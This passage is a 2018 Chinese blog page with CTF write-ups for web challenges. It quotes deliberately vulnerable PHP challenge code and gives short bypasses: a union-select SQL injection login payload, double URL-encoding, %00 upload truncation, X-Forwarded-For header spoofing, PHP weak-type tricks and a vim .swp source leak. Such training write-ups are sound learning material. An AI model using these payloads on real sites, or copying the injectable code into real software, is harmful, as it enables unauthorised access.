@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>西普实验吧-web | Archimesan</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="西普实验室-web题目学习">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="西普实验吧-web">
+<meta property="og:url" content="http://archimesan.me/2018/02/01/西普实验吧-web/index.html">
+<meta property="og:site_name" content="Archimesan">
+<meta property="og:description" content="西普实验室-web题目学习">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/1-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/1-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/2-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/2-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/2-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/3-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/3-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/3-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/4-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/4-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/4-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/5-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/5-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/5-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/6-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/6-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/6-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/7-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/7-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/8-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/8-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/8-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/9-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/9-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/9-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/10-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/10-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/11-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/11-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/11-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/12-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/12-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/13-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/13-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/14-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/14-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/15-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/15-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/15-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/15-4.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/15-5.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/15-6.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/15-7.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/16-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/16-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/16-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/16-4.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/17-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/17-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/17-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/17-4.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/18-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/18-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/19-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/19-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/19-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/19-4.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/19-5.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/20-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/20-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/20-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/21-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/21-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/22-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/22-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/23-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/23-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/23-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/23-4.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/23-5.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/24-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/24-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/24-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/24-4.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/25-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/25-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/25-3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/25-4.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/25-5.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/26-1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/26-2.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/26-3.png">
+<meta property="og:updated_time" content="2018-02-02T07:56:58.014Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="西普实验吧-web">
+<meta name="twitter:description" content="西普实验室-web题目学习">
+<meta name="twitter:image" content="http://archimesan.me/2018/02/01/西普实验吧-web/1-1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Archimesan" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Archimesan</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">因为深爱，所以无所畏惧！</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/Home">博客首页</a></li>
+                        
+                            <li><a href="/archives">作品展示</a></li>
+                        
+                            <li><a href="/2017/12/14/CTF学习/">CTF学习</a></li>
+                        
+                            <li><a href="/FrontEndGuide">前端导航</a></li>
+                        
+                            <li><a href="/tags">文章标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1406579947@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/archimesan" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="#" title="weibo">weibo</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/工具下载/" style="font-size: 10px;">工具下载</a> <a href="/tags/常见漏洞/" style="font-size: 16.67px;">常见漏洞</a> <a href="/tags/经验分享/" style="font-size: 10px;">经验分享</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://archimesan.me">name</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱学习、爱dota、爱荣耀，更爱家庭的普通宅。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Archimesan</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Archimesan</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">因为深爱，所以无所畏惧！</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/Home">博客首页</a></li>
+                
+                    <li><a href="/archives">作品展示</a></li>
+                
+                    <li><a href="/2017/12/14/CTF学习/">CTF学习</a></li>
+                
+                    <li><a href="/FrontEndGuide">前端导航</a></li>
+                
+                    <li><a href="/tags">文章标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1406579947@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/archimesan" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-西普实验吧-web" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/02/01/西普实验吧-web/" class="article-date">
+      <time datetime="2018-02-01T09:19:44.000Z" itemprop="datePublished">2018-02-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      西普实验吧-web
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>西普实验室-web题目学习</p>
+<a id="more"></a>
+<h2 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h2><p><img src="1-1.png" alt=""></p>
+<p><img src="1-2.png" alt=""></p>
+<p>用sqlmap跑一下</p>
+<p>用户密码跑出来就行了。</p>
+<h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><p><img src="2-1.png" alt=""></p>
+<p><img src="2-2.png" alt=""></p>
+<p><img src="2-3.png" alt=""></p>
+<p>提交即可。</p>
+<h2 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h2><p><img src="3-1.png" alt=""></p>
+<p><img src="3-2.png" alt=""></p>
+<p><img src="3-3.png" alt=""></p>
+<p>总结：<br>zh-CN<br>zh-hk  小写<br>en-gb<br>.NET CLR 9.9<br>IE<br>x-forwarded-for:1.1.1.1</p>
+<h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p><img src="4-1.png" alt=""></p>
+<p><img src="4-2.png" alt=""></p>
+<p><img src="4-3.png" alt=""></p>
+<h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p><img src="5-1.png" alt=""></p>
+<p><img src="5-2.png" alt=""></p>
+<p><img src="5-3.png" alt=""></p>
+<h2 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h2><p><img src="6-1.png" alt=""></p>
+<p><img src="6-2.png" alt=""></p>
+<p>普通的数字型显错注入</p>
+<p><img src="6-3.png" alt=""></p>
+<h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p><img src="7-1.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure>
+<p>hackerDJ 经过两次urlencode即可</p>
+<p><img src="7-2.png" alt=""></p>
+<h2 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h2><p><img src="8-1.png" alt=""></p>
+<p><img src="8-2.png" alt=""></p>
+<p>直接复制到浏览器的console运行即可</p>
+<p><img src="8-3.png" alt=""></p>
+<h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><p><img src="9-1.png" alt=""></p>
+<p><img src="9-2.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">	<span class="variable">$conn</span> = mysql_connect(<span class="string">"********, "</span>*****<span class="string">", "</span>********<span class="string">");</span></span><br><span class="line"><span class="string">	mysql_select_db("</span>phpformysql<span class="string">") or die("</span>Could not select database<span class="string">");</span></span><br><span class="line"><span class="string">	if (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="string">		die("</span>Connection failed: <span class="string">" . mysql_error(<span class="variable">$conn</span>));</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span></span><br><span class="line"><span class="string"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$sql</span> = "</span>select pw from php <span class="built_in">where</span> user=<span class="string">'$user'</span><span class="string">";</span></span><br><span class="line"><span class="string"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span></span><br><span class="line"><span class="string">if (!<span class="variable">$query</span>) &#123;</span></span><br><span class="line"><span class="string">	printf("</span>Error: %s\n<span class="string">", mysql_error(<span class="variable">$conn</span>));</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span></span><br><span class="line"><span class="string">//echo <span class="variable">$row</span>["</span>pw<span class="string">"];</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  if ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span></span><br><span class="line"><span class="string">	echo "</span>&lt;p&gt;Logged <span class="keyword">in</span>! Key:************** &lt;/p&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else &#123;</span></span><br><span class="line"><span class="string">    echo("</span>&lt;p&gt;Log <span class="keyword">in</span> failure!&lt;/p&gt;<span class="string">");</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$sql</span> = "</span>select pw from php <span class="built_in">where</span> user=<span class="string">'$user'</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+<p>直接用户写  ‘union select md5(1)#    密码写 1  即可绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pw from php <span class="built_in">where</span> user=<span class="string">''</span> union select md5(1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="9-3.png" alt=""></p>
+<h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p><img src="10-1.png" alt=""></p>
+<p><img src="10-2.png" alt=""></p>
+<p>写个逆运算即可 </p>
+<p>python脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>.encode(<span class="string">'rot13'</span>)[::-1].decode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">""</span>.join([chr(ord(i)-1) <span class="keyword">for</span> i <span class="keyword">in</span> a])[::-1]</span><br></pre></td></tr></table></figure></p>
+<h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><img src="11-1.png" alt=""></p>
+<p><img src="11-2.png" alt=""></p>
+<p>通过%00截断</p>
+<p><img src="11-3.png" alt=""></p>
+<h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p><img src="12-1.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">      die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>md5弱类型</p>
+<p><img src="12-2.png" alt=""></p>
+<h2 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h2><p><img src="13-1.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'password'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'password'</span>])</span><br><span class="line">        die (<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>清空cookie，password也为空</p>
+<p><img src="13-2.png" alt=""></p>
+<h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p><img src="14-1.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="14-2.png" alt=""></p>
+<h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><p><img src="15-1.png" alt=""></p>
+<p><img src="15-2.png" alt=""></p>
+<p>查看源代码发现</p>
+<p><img src="15-3.png" alt=""></p>
+<p><img src="15-4.png" alt=""></p>
+<p><img src="15-5.png" alt=""></p>
+<p>因为是vim 考虑源码泄露 尝试 .submit.php.swp</p>
+<p><img src="15-6.png" alt=""></p>
